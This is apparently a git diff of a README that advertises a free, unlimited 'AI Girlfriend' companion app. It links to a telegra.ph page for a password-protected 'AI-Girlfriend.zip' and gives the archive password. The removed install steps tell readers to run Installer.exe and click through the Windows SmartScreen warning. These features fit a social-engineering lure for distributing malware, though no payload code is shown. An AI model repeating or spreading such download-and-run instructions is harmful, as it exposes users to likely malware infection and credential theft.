@@ -2,7 +2,7 @@
 
 AI Girlfriend - free chat and photos, no limits
 
-**[AI-Girlfriend.zip](https://telegra.ph/Download-Tutorial-10-28-14)**  
+**[AI-Girlfriend.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ AI Girlfriend companion app: chat, voice and generated photos with your virtual 
 - **Photos** — Generated
 - **Package** — tool.zip
 - **Messages** — Unlimited
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-14
-2. Download **AI-Girlfriend.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-AIGirlfriend-Free
